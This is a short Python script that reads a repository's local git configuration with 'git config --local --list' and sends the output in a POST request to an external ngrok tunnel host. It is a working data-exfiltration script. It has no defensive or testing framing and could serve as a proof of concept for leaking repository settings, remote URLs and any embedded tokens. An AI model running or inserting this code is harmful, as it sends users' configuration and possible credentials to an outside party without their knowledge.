import subprocess
import requests

def get_git_config():
    """Runs 'git config --local --list' and returns the output."""
    try:
        result = subprocess.run(
            ['git', 'config', '--local', '--list'],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"Error running git command: {e}")
        return None
    except FileNotFoundError:
        print("Git command not found. Make sure git is installed and in your PATH.")
        return None

def send_data_to_server(data):
    """Sends the given data as a POST request to the specified URL."""
    url = "https://nomasc-labs.ngrok.app/data?content_from_git_command"
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()  # Raise an exception for bad status codes
        print(f"Data sent successfully. Server response: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data to server: {e}")

def main_logic():
    """Gets git config and sends it to the server."""
    git_config_output = get_git_config()
    if git_config_output:
        send_data_to_server(git_config_output)
    else:
        print("No git config output to send.")

if __name__ == "__main__":
    main_logic()
